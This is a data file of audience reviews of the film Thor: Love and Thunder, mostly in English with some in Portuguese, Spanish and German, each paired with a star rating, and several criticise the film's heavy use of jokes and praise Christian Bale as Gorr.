"im just so mad.. its not that it couldn't have been good there was a lot of potential.. but between the ofbeat humor, insensitive humor, and the biggest pothole in the MCU this was just so insulting",0.5
"For me, this is a mediocre film. The jokes are incredibly unfunny, the story is meh, the only thing that's even remotely good is the acting. Despite all of that, you can pass the time watching it.",2
"I went to watch it at the cinema with great expectations, not least because the trailers seemed to be something very cool, and I had already liked Taika Waititi's work in Thor: ragnarok (which is the best film of this hero), however, like all the phase 4 films, the film came with a taste of disappointment. But unlike the Multiverse of Madness and Wakanda Forever, which were disappointing but good, Love and Thunder is a complete disaster. While reasonably entertaining, the film's tone is ridiculous and jokes happen all the time and out of turn. The god butcher was very poorly used, being even a bit of an idiot in some scenes, in addition to the fact that he practically didn't kill anyone. Some scenes lack logic, like Thor, who has thousands of years of experience, couldn't defeat Gorr, but Jane Foster, who just gained her powers, does it easily, apart from that final scene of the children fighting, that was ridiculously bad and meaningless, it felt like I was watching a Disney princess movie.",2.5
"She's really stupid, the only thing that can be saved is Gorr (Christian Bale), who is incredible but the rest are meaningless jokes. PD: Goats GOD",3
This was a disappointing addition to an overall (usually) fun series. It's fine.,3
Great! Loved the deep story behind as well as the funny part. Good combination. As an MCU fan I give it a 10/10 ü´Ä,5
Awful caricatures of all the characters bloated and putrid after soaking in Waititi's self indulgent god complex.,1
"What the hell were the writer thinking when they made this? Do they think shoving a ""joke"" down our throats every 30 seconds is funny? It completely ruins the entire appeal of the movie, it takes away any emotion from any scenes, it just ruins the movie entirely. This is the worst movie I have ever seen",0.5
"not sure why it got all the online hate - it was more than good enough - not perfect, and dont forget the last one and last two Avengers movies were really hard to top... but more than entertaining and different.",4
"Probably the worst MCU film. Such a misfire, from the humour to the story to how they handled the villain. Truly terrible stuff.",1.5
"Too much Disney influence, did get better towards the end...",2.5
Why make the main character a stupid neanderthal? Horrible movie,0.5
Not bad but shows how bad the MCU has become.,3
"Pior filme da Marvel, pegou a melhor fase de hist√≥rias do Thor nos quadrinhos e cagaram em cima, Taika Waititi se superou.",0.5
"Absolutely incredible. Suitably funny, full of adventure and great casting",5
"Terrible film. The scripting is some of the laziest and the jokes were an embarrassment to marvel and the actors. I wish I had left half way through and demanded my money back when I watched this film. The only silver lining was Christian Bales great performance, but sadly it almost looked out place in such a mediocre film.",0.5
The movie was about love and thunder. And it worked,5
Campy action schlock with a few shining moments. Taika Waititi's head was fully lodged in his backside for this one.,2
"I do admire Waititi's unique style - but the jokes were often unfunny, and some scenes were painfully banal. It was great to see Natalie Portman reprise her role though! Also, Christian Bale's character was haplessly wasted; the God Butcher had a lot of potential.",3
"I think that this is a great movie the only thing I did not like is Gorr he's such a bad character don't get me wrong Christian Bale is a legendary actor but for Gorr being called ""The God Butcher"" he didn't butcher anyone which really bothers me because I'm not a big comics fan and out of everything I heard I expected a lot from Gorr but I didn't like him he disappointed me. Action was great I but I think that the Gorr vs Thor fights should have been more kick ass like a Captain America vs Bucky in ""Captain America Winter Soldier"". Acting, I think that the acting is perfect I don't care about what anyone thinks I loved the acting Chris Hemsworth, Christian Bale, Natalie Portman, and everyone that has took part in acting in this movie have all done a amazing job. CGI, ok so I watch a lot of stuff and I gotta tell you compared to other movies & series this movie has perfect CGI. Writing in my opinion is great-perfect but I don't know why it was hard for Thor to fight Gorr I think the writing for there fight scenes could have been better. Story I think that it's good compared to other movies I've watched in 2022 the story is amazing. Casting, is perfect no explanation needed. Characters, I love them all they're all great I really with that we get them in a 5th Thor movie. Adventure, I think that the adventure is great traveling thought space and dimensions that's all a really cool part of the adventure. Ending I love the ending because now we know that Loki and all the other killed off Thor characters & gods are alive but in another world or another dimension or a heaven for gods. Something that I think is one of the best parts of the movie is that this movie does focus a lot more on Jane's & Thor's relationship cause' the other Thor movies didn't to that so well and the relationship is perfect and we finally figure out how Thor & Jane break up. I do wonder what happens with Hercules because like I said I'm not a big comics fan so I want to know how Hercules and Thor come across each other and if they're gonna be friends or alies.",4.5
"I'll just start by saying, Thor Ragnarok is still my favorite Thor film, and this is a diststant second. First off the comedy. In my view, there were just so many jokes that didn't land, that it took me out of the experience. I get that Marvel films are supposed to have comedy in them, but please just tone it down a bit and make the films a bit more serious. One of the reasons I liked Eternals and Multiverse of Madness is that they didn't rely too heavily on comedy. Now while Thor Ragnarok did have comedy it made it work, where as this film feels like it would be a lot better with a more serious tone. The film deserves some credit, however, for handling Jane's illness with some seriousness, for having an awesome rock soundtrack, and for having some beautiful cinematography. As well, Christian Bale's performance as Gorr was incredibly good, and had a certain intensity many mcu villains lack. With this though, apparently some of Gorr's screentime was cut due to being to scary which is really disappointing. If a villain is supposed to be terrifying then make him terrifying. Overall though it's a pretty subpar MCU film with no moments that really standout. It is worth seeing however if you want to have fun in the cinema, but don't expect too much more.",3.5
This movie was just ruined with the way too many bad corny jokes. It should have been way more serious. Big disappointment!,2
"Simply awful. A complete mix that had nothing to do with the original Thor. Disgusting music, and even worse writing.",0.5
Thor is my favorite Marvel Avenger. I enjoy the humor. Hemsworth is great at making fun of himself so I also get a kick out of that. Storyline here needed help and I was bored in parts but still‚Ä¶ it is Thor.,3.5
"Thor: Love and Thunder is a thrilling and visually stunning Marvel adventure. With outstanding performances, witty humor, and epic action, it's a must-watch for fans of the franchise. While the plot may feel complex at times, the film delivers an enjoyable experience that expands the Marvel universe with style.",4
M-She-U take one of the biggest Heros in MCU with a great Charakter History than Take STRONG Womans in Lead and change Thor himself Into a Clown. Chris? Why you Play this Role ? is money so important to you that you have to play a joke character? Ask yourself how you want people to remember you as Thor.,1
Potential character wasted with cheap and childish jokes.,0.5
Such a let down after Thor Ragnarok.,1.5
"I watched this with my wife. We had a laugh, we had a cry. We were excited to see everything! It was fun because it was supposed to be fun. I genuinely don't get why 'mericans don't like it.",5
"O filme tem algumas piadas engra√ßadas, mas deixou o Thor muito bob√£o. A luta final foi lament√°vel, realmente achei mais um filme de her√≥i padr√£o. O CGI do filme em algumas cenas pecou muito tamb√©m. Esse filme parecia que iria ser muito bom, mas achei que o excesso de piadas e algumas cenas que pareciam serem feitas a pressa, deixaram o filme ""esquec√≠vel"", onde eu n√£o fa√ßo quest√£o de assisti-lo novamente.",2
"The idea, let me be clear again, THE IDEA of what Christian Bale could've done with his character sent chills through my spine. Sadly, Taika Waititi obliterated any hopes of seeing this character come to his prime. Please, i beg of you Marvel, DO NOT let Mr. Waititi come any closer to any Thor movie ever again. And that's only IF the Thor franchise has any future after the disaster this movie was.",1.5
"I'm blessed I didn't go to the cinema to see it. It's unbearable. I like chineese drama like Kung-Fusion, but this is just a poorly made parody of a parody. This movie would not be able to lift Mjolnir, because it's not worth-it.",0.5
Solo el villano estuvo bien... El resto fue un mal chiste,2
This movie was pretty mid. Funny at parts but pretty cheesy- coulda done way better,3
"Thor: Love and Thunder"" is an entertaining movie that fans of the Marvel Cinematic Universe are sure to enjoy. The film boasts a talented cast, with Chris Hemsworth once again delivering a strong performance as Thor, and Tessa Thompson and Natalie Portman adding depth to their respective characters. The action scenes are well-choreographed and visually stunning, and the humor is well-balanced with the more dramatic moments. However, the plot is somewhat predictable and lacks the emotional weight of previous Marvel films. Overall, ""Thor: Love and Thunder"" is a solid addition to the MCU, but falls short of being a truly great superhero film.",3
"A joke that became a joke. A farce. Reprehensible nonsense that has basically taken MCU three steps back. Thor is a name - not a title. Hammers aren't sentient, a 'king' is a man. Korg isn't funny. Zeus isn't a fat douche with a plastic toy 'thunderbolt' Taki had a good time with Ragnarok and for the most part it was decent enough, but now he's just taking the p***",1
"I honestly don't understand the hate behind this one. I was a bit skeptical about Jane Foster's return the moment this movie was announced, and the name of it seemed a bit cringe, but I thought the movie knew exactly when to make fun of itself and when not to. Had it been a bit longer and we'd had more scenes showing Gorr actually killing gods, I think my rating would've been higher(and maybe the same for the critics). It's strange since this movie made good money similar to MoM(which I hated) yet I see a great majority of people complaining about it. Oh well.",4
"I didn't believe it would be possible for the MCU to make me hate both The Hulk, She-Hulk and Thor but Taika Waititi did the impossible. The only three saving grace for this movie is Chris Hemsworth PED muscles, and the two ending scenes.",1
"By far the worst Thor movie. While Christian Bale does an excellent job as Gorr, he just doesn't have enough scenes in the movie to properly flesh out his character. Every scene Gorr is in is incredible, Bale does a wonderful job of portraying this terrifying villain. Unfortunately, the rest of the movie is too focused on making jokes to create a cohesive story. While in Ragnarok, Waititi's jokes landed all the time, in this movie they were more hit or miss (screaming goats aside, they were absolutely hilarious). Finally, the ending doesn't really work for me -- Gorr just completely flips his motivations on a dime and the movie doesn't spend enough time on this to make it believable. Still overall a fine movie, just didn't come anywhere near my expectations.",4
"Thor: Love and Thunder is an entertaining and fun film, but its overuse of comedy make the more serious moments forgettable. Rating: 61%",3.5
Maybe the worst movie I ever paid to see in the theater. Horrible.,1
"This movie was bad with a capital B. What has Marvel turned in to‚Äîthe only actor who seemed like he put any effort into the movie was Christian Bale. The CGI was bad, phoned in performances, wait to reliant on jokes, incoherent plot. Please do yourself a favor and skip this even if you have Disney + and can watch it for free. Oh Boy ü§¶üèª‚Äç‚ôÇÔ∏è",0.5
"Was expecting it to be connected to what happened in the Loki series, but no, it was, insert ""joke"" here, and then here too, plus screaming goats every 5-10 minutes. Its only saving grace was Christian Bale. He stole every scene he was in.",3
einen stern f√ºr christian als gorr und seine optische darstellung. top der rest ist versuchte comedy mit schlechter cgi ... das l√§cherlich machen eines aus teil 1 und 2 helden .... und ich dachte in teil 3 h√§tte man ihn schon zerst√∂rt .... disney vernichtet hier seine helden,2
"A lot of people said this was a bad film A lot of people weren't wrong. Shonky effects, a script seeming written by a malfunctioning early version of Chat GPT, a comic tone with barely a single successful gag, and nothing that remotely resembles a plot. In theory, I like Taika Waititi; in practice, I haven't seen a single film of his I unreservedly like. I wonder if he's in a similar place to Tarantino in that he needs people around him to whom he listens and who are willing to say that it's not working. Someone also needs to take the MCU firmly by the scruff of the neck and either reconnect it with good ideas or just call time on the whole thing. This is a tired film which, at this point in the franchise, is part of a tired project. I like the name 'God Butcher', and the idea he represents has mileage as an antagonist, but like everything else here it doesn't work. It's such an unredeemable mess of a film that's it hard to see what anybody was thinking when it was conceived.",1
Alot don't like thor love and thunder but ita a good fun flim definitely didn't deserve the hate it received,3.5
"The whole thing is a disaster. The dialogues are attrocious, the transition between scenes have no continuity, the events have no background nor explanation afterward, the action is very lacking, and they overall atmosphere doesn't fit the suposed seriousness of the events unfolding. Looks like if what's written by a 13yo who thinks is funny.",0.5
Film is at Times corny and sometimes it is a bit questionable but overall ok,3.5
"The dialogue isn't great, but the movie is even funnier than the last one, and has multiple Guns N' Roses songs, which makes it pretty great.",4
"Dissapointed , it had something going on with it , it got romance , and action that's about it . The jokes arent funny and its not a good movie but i'll at least give this a 5/ 10",2
Not funny at all‚Ä¶and way too many plot holes.,1.5
"This movie is just a comedy fanfest and if they took things more seriously, this movie could have been better.",3
"Malisima pelicula, desaprovechan todo y encima buenos actores, esta pelicula es peor que ant man, director mediocre y la historia y personajes flojos. Tenia potencial la historia pero la desaprovecharon",1
"It passed the time.... What more is there to say? It was stupid and silly but I did laugh a bit however the character drama wasn't great. The Villain was good but heavily wasted by the stupidity of the main love plot. I mean overall, it was fine but I didn't think it was that good",1.5
For a comedy this was extremely unfunny,1.5
"I was not very impressed with this movie expected a little more with Christian Bale in the movie. I don't agree with the same sex being put so boldly put into Disney movies, I would prefer not to have story lines that involve this kind of garbage for my child to see. With that being said I would watch them before letting your chip watch any movies from Disney that approve such a message. This was a very sad attempt of a Marvel Movie.",3
"I say this with a heavy heart considering Thor has always been a favorite of mine amongst the Marvel heroes, this film desecrated Thor AND Gorr the God Butcher. While it was a fun adventure as all MCU films tend to be, every serious moment was undercut by an unnecessary joke.",3
"Waititi has taken the tone he started with ‚ÄòRagnarok' (which was kinda fun because it was very different at the time, but already exhibited all of the same problems to a lesser degree) way too far and veered straight into campy ""comedy"" (quotation marks because it's rarely funny) with the odd injection of dark and serious -- courtesy of Bale who does great work that's utterly wasted here ‚Äì which doesn't fit in with the majority of the rest of the film. It's like watching a parody with little-to-no stakes, bland action, and a script that is basically pointless with nothing to get invested in. I'm sure the whole crew had a blast filming this and good for them, but apart from perhaps 30 mins. towards the end, ‚ÄòLove and Thunder' is a pretty stupid joke that takes away any last shreds of dignity and respect Thor had, completing his transition into a character that you can no longer take remotely seriously. Someone described him as a ‚Äòhimbo' in their review and they couldn't have been more spot on ‚Äì the ultimate himbo.",1.5
"Taika should never direct or be a writer of any Marvel movie ever again. He made a complete mockery of the Thor character and ruined the story of Gorr. It made no sense to have Christian Bale give such a dramatic performance with Hemsworth and Portman's bad comedic acting. Also, the ""costumes"" were ridiculous. If this is how they are going to continue portraying Thor in the future then if Hemsworth wants to continue to play this character, he should reconsider.",1
"So sad to call this a Marvel movie.. Its just keeps getting worse. Where is the writing, where every detail is thought of.",2.5
I will prob never watch it again. It was ok. Not a great plot. Waste in christian bales character. They could have done a lot more with him. Watch if you want but temper your expectations.,2.5
"This movie got a lot of hate, but while it isn't perfect, I think it was quite a fun adventure. A lot of people seemed to expect a dark film focusing on the fight between Thor and Gorr, so they were disappointed when they got a rom-com in space. Does it not being what you wanted make it bad though? I don't think so.",3.5
It is not The best THOR movie but in my opinion is is not the baddest movie The Story was Good The Godbutcher was asociaal But it had to Many jokes,3.5
"I would recommend it to someone, but don't recommend to rewatch. I watched it in the movie theater, and I really enjoyed it, and then I rewatched it on Disney plus and it was't as good. It is really funny if you like the type of humor from the third movie, but look at it for what it is- a comedy.",3.5
It was so bad its funny. The best part was watching the actors in cameo roles looking like they were having a great time camping it up. Like Melissa McCarthy as Odin's daughter and Russell Crowe as a chubby Zeus.,2.5
Marvel wasted Cristian bail they will not be forgiven,1
"The Movies is a littles overhated, but the comedy does stink. But when it gets serious, it gets serious. It's ok, i guess",3
"This movie sucks. Thor Ragnarok is literally my favorite marvel movie, so I was super disappointed. Literally all the jokes feel like they are recycled from Ragnarok. Gore is fantastic though.",1.5
A great cast doesn't make a great movie. Lame story and poor performances.,2
MIDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD,2.5
"Gets 31/2 from me coz the beginning scene was a joke! That was so stupid, not funny! Good story about Jane and her actions were awesome though! I am a fan of Marvel but not of this particular one and honestly Shazam 2 should get more rating than this! Critics must be coo coo to rate this higher than Shazam 2! üò´üôÉ",3.5
"Creo que se est√°n cargando el personaje, en cada pelicula parece que es un personaje diferente, pero prefiero comentar las cosas buenas en vez de vomitar mi toxicidad que puedo volcar aqu√≠ que es mucha. Entretiene, que ya es mucho decir para los tiempos que corren. Y el villano est√° bien construido y creo que tiene una motivaci√≥n a la altura. No sobra ning√∫n personaje y ninguna escena, por lo que la pelicula no se hace tediosa ni larga.",2
"I love the visual effects but as a comic fan (Gorr The God Butcher being my favorite villain) I am disappointed in the way they strayed from the source material, this was a story that should have shown alot more butchery and not so much comedy, a story like this should have made an R rated film. And with the multiversal concept in marvel movies lately, the story of Gorr and the GodBomb and its construction by multiple thors from different timelines could have easily been adapted into a multiversal Thor variant movie.",2.5
Its kinda boring and just very unfunny.,1.5
"While the silliness definitely takes away from some of the more serious moments in this movie it still feels like a good Thor movie. There is so much to this and so much that can be set up from this going into a possible phase 7 with Galactus. I'm not a comic reader, but an avid MCU enjoyer, and this holds up very well.",4.5
"So spectacular, so queer, so fabulously funny!",5
"The jokes were CRINGE (and Korg's song was lewd) but the action and the feats of strength by Thor were great. I don't like Natalie Portman but she did a great job in this movie and her ""look"" as Mighty Thor complimented Thor. Great team. Valkyrie was a good supporting character. Gorr was OK.",4
Muy mala la pel√≠cula aburrida trama sencilla,0.5
"Thor love and thunder is probably the weakest mcu film and the weakest thor film, The big negative i have with this film is that this is literally feels like a parody of thor none of the jokes land, the humor overshadows the films serious moments, gorr the god butcher is great but should've been in a different mcu film, 2.5/5",2.5
"HORRIBLE! STOP BREAKING EVERY DEEP MOMENT WITH CHEAP JOKES! NOT EVERYTHING NEEDS TO BE FUNNY, AND EVEN WHEN YOU TRY IT ISN'T FUNNY! INVEST YOUR TIME IN CHARACTER DEVELOPMENT! EVERYONE IS A PARODY OF THEIR FORMER SELVES! Unwatchable.",0.5
"Too many jokes, the plot didn't make sense, they wasted Christian Bale in this movie, the whole film was trying too hard to be funny but the CGI was good but the story was pretty off but i did enjoy having Natalie Portman back in the game well temporarily anyways",3.5
"Horrible....the jokes were so stupid i could not believe it...i was waiting for someone , like the story teller, to say it was all wrong. and the action was Not....how do the Guardians of the Galaxy not defeat a dozen fairy owls? who did not see thor stopping the two scooter bikes? who did not see the towers falling after thor scorched up the middle? i stopped watching about half way thru...not sure if i care enough to finish...thor is so self centered, aweful!",1
Not a fan of ‚Äústupid‚Äù Thor. But a fun family movie nonetheless,3
Silly to the point of distracting.,2
"un thor perdido en la comedia e irrelevancia ,un gorr que aparece talvez menos que los guardianes de la galaxia y que no aporta nada interesante en todo el nudo de la pel√≠cula una actuaci√≥n genial e historia profunda de christian bale como gorr pero solo en el inicio solo en el inicio y final de la pel√≠cula , un final que adore y una natalie portman fant√°stica pero que no sostienen a la pel√≠cula del ¬®¬®dios del trueno¬®¬® enserio ya se nesesita el thor n√≥rdico,un nuevo director y una trama mas seria",2.5
Why i tried it? don't know.,2
"Realmente disfrute esta pel√≠cula, es bastante disfrutable en aspecto visual colorido y nunca faltan las buenas escenas de acci√≥n y los asombrosos efectos especiales. El detalle aqu√≠ es que la pel√≠cula est√° muy orientada a la comedia, d√°ndole un tono caricaturesco y se siente como una parodia de Thor. El personaje de Zeus de Russell Crowe es demasiado caricaturesco y termina aportando muy poco. Chris Hemsworth sigue siendo lo mejor como Thor y Natalie Portman ahora tiene m√°s participaci√≥n. La relaci√≥n entre Thor y Jane Foster le da vida a esta pel√≠cula m√°s que en las primeras 2 entregas y hay m√°s qu√≠mica entre ellos. Christian Bale en el papel de Gorr es un extraordinario villano, bastante sombr√≠o y con una buena historia que justifica sus acciones. Otra de las cosas m√°s excitantes de la pel√≠cula es la banda sonora, que incluye canciones de Guns N' Roses que ofrecen momento realmente emocionante. Por m√°s que esta pel√≠cula termine siendo una parodia, logra cumplir su objetivo de entretener como cualquier pel√≠cula de Marvel. Mi clasificaci√≥n final para esta pel√≠cula es un 9/10.",4.5
This whole movie is a cringe fest and there is way to many jokes that all fell flat and I cringed at. The positive is Gorr the god butcher even though it‚Äôs wasted potential.,1.5
Slow. The forced romance scenes make it difficult to watch.,2.5
"Worst movie in marvel franchise history! This went completely 180 from ragnorok despite having the same director. People who have enjoyed this movie must have not been long time fans of the MCU because this was supposed to be best opportunity for Thor to be one of the most admired characters in the MCU possibly over most of the fan's favorite hero. Instead too many jokes that don't make you laugh, no sense of a real threat, no real twist that will have you shocked and a complete mockery of everything laid out before in the thor franchise I am absolutely disgusted.",0.5
"If I could give it 0 stars, I would. There is zero redeeming qualities about this movie. Thor, Mjolnir and Stormbreaker's little odd jealousy thing was cringe. The god pantheon, was unfunny. Giving all the kids powers was like, are you trying to be Shazam now? Dumb. Tried way too hard to be funny the entire movie and none of the jokes landed. Then tried to be serious and they felt unattached. After Ragnarok and it's solid mix of action, seriousness and humor... Love and Thunder was an absolute fail. Also you can see, positive review bombing is a thing, because outside of these review sites... I've heard exactly ZERO people say anything positive about this movie.",1
first mid movie from marvel cinematic universe. To many dumb and cringe jokes. Bring me back my old goat. Gorr was great but it is only one pro.,2.5
"Foi extremamente decepcionante, Taika watiti teve toda liberdade e passou dos limites, na consegui reconhecer a grandeza do DEUS DO TROV√ÉO em meio a tantas piadas sem gra√ßa e desnecess√°ria s. Mas ainda assim √© poss√≠vel se divertir com esse filme se activares o modo infantil!",2
Thought the movie was a lot of fun. I‚Äôm not a huge marvel movie fanatic but enjoyed this one. And so did my kids,3.5
"Disrespectful of the larger MCU. They built something special with the Infinity Saga, this is very dismissive of the masterful universe building and thoughtful serious storytelling that preceded it.",2.5
Worst MCU movie of all time the entire movie is just a 2 hour SNL skit,0.5
It's not bad but the comedy is terrible,2.5
Very bad movie it fell ment for kids,2
This isn't Thor. Disney just destroying property after property at this point to push a narrative,0.5
"Probally the worst films i've ever watched. The comedy comes on way to strong, i only laughed twice in a film that is 80% jokes. I don't recommend it. Don't waist your time, you'll be disappointed.",0.5
"No, it's got it wrong, big time. Way too much faux comedy for the sake of it that does nothing to help enjoyment. Disastrous script for poor Russell Crow to perform, a pointless plot, and a pretty dull ending. If Marvel carries on like this it will kill off the franchise.",2
"Descaracteriza√ß√£o total dos personagens, desperd√≠cio de um grande vil√£o e ator (Christian Bale) caracteriza√ß√£o de personagem horr√≠vel!",0.5
"This movie was just incredibly awful, this movie was just way too wimpy and too kid like they totally pandered to 5,6 and maybe 7 year olds for this movie. This was the worst Thor movie in history",1
Loved the movie it was a lot better then the first 2 Thor's and is almost as good as Ragnarok if only they spent more time on the God killer killing gods but otherwise it's a great fun watch.,5
Fun movie for super hero fans.,5
"Last we saw Thor Odinson (Chris Hemsworth) in 2019's ‚ÄòAvengers: Endgame', he had relinquished the throne of Asgard to Valkyrie (Tessa Thompson) and set out with the Guardians of the Galaxy to chart his own path. Now, in ‚ÄòThor: Love and Thunder' (his fourth solo film), when a vengeful man (Christian Bale) with a serious grudge against the gods of the universe begins killing them off one-by-one, Thor must part ways with the Guardians and put an end to the slaughter. This time, however, besides King Valkyrie and rocky sidekick Korg, he has an unexpected new ally fighting by his side in the form of ex-girlfriend Dr. Jane Foster (Natalie Portman) who, by wielding his former hammer Mjolnir, has become the Mighty Thor! Thor and Jane's relationship takes center stage here, as this film is essentially Marvel Studios' first romantic comedy, and director/writer Taika Waititi (returning from 2017's ‚ÄòThor: Ragnarok') and co-writer Jennifer Kaytin Robinson breathe new life into said relationship and truly make you want to see them get their ""happily ever after"". Chris Hemsworth's and Natalie Portman's chemistry is great, and I cared about these two more than I ever have before. The comedy was pretty hit-or-miss for me, but thankfully most of it landed. It's just as silly as its predecessor ‚ÄòRagnarok' (perhaps even more so), but there are also some really emotional moments that balance out the silliness. Unfortunately, the story does often feel rushed, and definitely could've benefited from being a bit more fleshed out. However, I absolutely LOVED the ending! I've also seen some criticism about the film's CGI, but everything looked real and convincing enough for me, so I have no complaints about it. The cast is a delight, and Hemsworth's Thor continues to be a highlight of the MCU, but Portman's Foster and Bale's Gorr the God Butcher really steal the show. Jane/Mighty Thor is such a likeable character and is impossible not to root for, and Gorr is honestly one of the creepiest, most unsettling movie villains I've ever seen, yet he's also sympathetic because of his motivations. We sadly don't see as much of the latter as I would've liked though, and I wish he had a bit more screen time. The film is also amplified by a rockin' soundtrack full of some of Guns N' Roses' greatest hits. Overall, ‚ÄòThor: Love and Thunder' is a heartfelt, fun, and enjoyable rom-com adventure, and a worthy inclusion to the MCU.",3.5
many will criticize me more this movie is worse than antman and the wasp 3 with dull jokes some horrible cgi but what saves from receiving 0 and the guns and roses and other cgi that worked,2
"Um dos piores filmes da Marvel se n√£o o pior, o filme tr√°s muitas piadas sem gra√ßa e fora de tempo, al√©m de um roteiro pregui√ßoso e que tenta se sustentar apenas nos momentos engra√ßados que n√£o tem gra√ßa, este √© o t√≠pico filme de se√ß√£o da tarde que voc√™ para de olhar no cap√≠tulo 3 e sai para fazer outra coisa.",1
Poor marvel outing. Too much free reign for Taika Waititi. The franchise has turned into a joke after the heights of the previous movie.,2.5
I watch this movie I see all the reactions and one thing just keeps on going through my head it's just really really fine just fine not OK not terrible just really mid Meh to be honest I did laugh at Thor and his hammer romance wherever the hell that was I genuinely laughed but then other sequences with screaming goats I don't know why they had so much screen time felt like the goats had more screen time and Christian Bale is it true if it is I'm going to cry because genuinely when I started off the film I was like why do people hate this then after that first couple of minutes I learned why like I said not absolutely terrible just very disappointing I was really hyped for this film and almost every level of dread came when I saw the rotten tomatoes original score sitting at a 68% that's not bad but for the MCU that's bad so I was confused because the movie looks so good and I'll give her that some action sequences are pretty good the CGI is a little wonky sometimes even when Disney put it on Disney+ it still looked bad I do feel bad for all those hard-working visual effects artist aren't getting enough time but at least marvel slowing down a little more because they really do need to take their time and figure out what to do next cause this film is a disappointment I really love Taika Waititi and Ragnarok and even more hunt for the Wilderpeople which is seriously under viewed so I don't know what he was thinking to do this film because there's a bunch of sources saying different things but out of everything this movie we needed more time and care not bad just fine I guess 5/10,2.5
If think it's a very good movie because it's fun and exciting,5
"WHY SO MANY DAMN JOKES? I get it Mr. Waititi, you have a great sense of humour but let me enlighten you, you are not as funny as you think!!! Thor as a character was at his peak in Avengers: Infinity War and after that, the studio just keeps ruining him. His development has been done in such a way that he has been losing everything he loved (firstly his mother, then his father, then half the asgardians along with Hemidall and his brother Loki). He is supposed to be depressed due to 1500 years worth of grief but this film chooses to avoid it all and make Thor a jumping, dancing, joke cracking happy lad!!! Jane Foster's Mighty Thor was pretty much okay in the film whereas Valkyrie and Korg felt completely unnecessary. Gorr was the only saving grace of the film but the film had to ruin that so his appearance is short-lived (not even 20 minutes). The name of the villian is Gorr The God Butcher, and we see him killing only one god on-screen ü§¶üèª‚Äç‚ôÇÔ∏è (talk about wasting a phenomenal actor such as Christian Bale). The Background Score composed by Michael Giacchino was also nice but again, was not properly used. It almost feels like this movie just wants to be average. First Multiverse of Madness and now this along with Ms Marvel, MCU is really starting to feel like Mid Cinematic Universe.",2
Not better than Ragnorok but still a great movie overall!,5
I wish it had been with serious with some funny parts; I think it‚Äôs hard when it tries to be booth. Great acting.,3.5
"It'¬¥s so bad that it hurts. The story is bad, the dialogues are bad, the acting is bad and Thor is bad. He lost everything. Literally everything and he still have a silly/dumb face.",0.5
"A beautiful story mixed with funny jokes and a happy ending, what's not to love?",4
"It's increasingly obvious just how fickle audiences are. Like what is the beef...? Every complaint I've seen about this movie can just be as easily applied to the previous entry, which was universally praised. It's really been ridiculous to see the gymnastics people do to convince why this is terrible over the other one. Has the Marvel fatigue just really set in THAT deeply? For me, Christian Bale isn't utilized as much as he should be able not all the jokes land, but I thought this was a super fun ride with tons of charm. Especially dug the wholesome wrap-up.",4
Campy. Disappointing that they choose to inject too much bad humor.,0.5
"The #1 problem of this movie is that there`s no way to unsee it. Characters, whose pathos, irony and optimism had co-existed in harmony before, were turned into a bunch of donkeys from Madagascar. And yes, that`s bad.",1
Too much childish comedy. The plastic costumes don't do it for me. The CGI at times is extremely bad. The characters do not feel real. This is the epitome of phase 4 issues.,1
"all of the jokes are either recycled from ragnarok, or new and just plain terrible. they turned thor from a fun yet tragic character who has lost everything in life to a bumbling idiot who makes uncharacteristic quips every 2 seconds. my least favourite marvel movie",1.5
its very funny and fun movie i totally recomend it,5
The screaming goat joke went on far to long got annoying after a while,3
"saw this movie opening night and instantly that this movie is really unnecessary to thor as a character and made him a joke, I don't know what takii was thinking but hopefully, the next thing he works on is better. the fight scenes were amazing, wanted more gorr the god butcher, and jane was cool and wanted to her take the hammer for the first time. Hopefully the next time we see thor he is more like the thor from god of war . also like he now has a kid so maybe they can do something with her in the next film like god of war did with Kratos and his son",3
Not as fun or inventive as Ragnarok. Longer then necessary and disjointed. Less fun on repeat watches. Should've stuck to a more clear storyline and developed the idea properly. Feels like 3 movies competing for time all loosely connected.,2
The movie may have contained jokes but it was just a terrible joke. The audience was screaming in pain louder than the dang goats. Perhaps a bit more titi and less wai wai wai.,0.5
Meh. It was just ok. Fat Zeus? Sometimes the Thor films rely too much on comedy and this one was a swing and a miss for me.,2.5
It is the worst movie ever and gets 0/10.,0.5
Its a movie for kids Cringeeeeeeeeee,0.5
It was more a sketch compilation than an actual movie.,1.5
"Although it might not be as good as Ragnarok, and it technically can be considered a Guns n' Roses music video, the latest installment of the Thor franchise is a severely underrated addition to the MCU. Its universal theme of ""love conquers all"" is a fantastic premise to build a ""Thor"" film upon.",4.5
Possibly one of the worst MCU films ever. Such a letdown. The CGI is laughable and the joke a minute script is horrendous. I will never watch this movie again. Terrible.,1
I can't wait to see what MCU will do with Hercules,5
"I wanted to see a movie about Thor learning to deal with his grief and loss while still being a hero. Instead, for the most part, the film acts as if Thor's already gotten over the events of previous movies. It's packed to the brim with out-of-place comedy while also trying to make us feel sad for Jane. Any attempts at seriousness were almost immediately curbed by more comedy. I did not enjoy the ending, it felt like the attention was being pulled away from Thor just to set up this new character. Hopefully, we will get a serious Thor in future movies.",1.5
"i love the rekindle of jane and thor's love, and still its funny",4.5
I wanted to like it. I really like Thor. This was not Thor. Thor is a super hero. This guy was a doofus.,1.5
It was one of the best theater experience and the movie is funny but the plot was not the best and they did not use Gorr enough.,3
"One of the worst films in the entire MCU, containing cheap, shameful, forced and tired humor. Taika just hits the soundtrack, he weighs his hand in humor and Thor once again boils down to a large cluster of totally unnecessary nonsense for what should be one of the most powerful heroes in the MCU, it's like taking Superman and betting on romance and comedy.",1.5
Cheesy comedy which was irritating. Felt more like B movie. Such a shame that this movie really lets down the marvel brand.,0.5
"Compared to the first movie, it was a joke. They could have made this SO much better. How do you make the god of thunder a giant wiener. Also Christian Bale's character could have been awesome, but‚Ä¶ wasn't.",1
"Taika Waititi made Thor a complete buffoon, the movie it is overstuffed with jokes that after the first 20 minutes it stop being funny, there's no deep and the motivation that drives the characters are empty. Only Christian Bale acting it is worth watching.",2
"Thor: Love and Thunder may be considered the best Thor movie to date, but it still has some shortcomings compared to other top-tier MCU films.",3.5
Was kinda a let down. The inclusion of the guardians was complete clickbait to get you into the theater Not as funny as Ragnarok Thor uses a power here for the first time that would have been 100 percent useful in every past Marvel film,3
"Story was rushed way too fast. Humor felt forced and repetitive. Lack a lot of emotion in the journey of the story. This movie had potential, but it was undoubtedly rushed resulting into a mess. I enjoyed it more than Thor the dark world, but it at least had more depth of story and emotion.",2
Hilarious üòÇ I love it ü©∑,5
"The movie made me smile. I thought it had the perfect mix of intense action, interesting visuals and a smile. I am not bothered by some of the critics nasty comments - they like to hate.",4.5
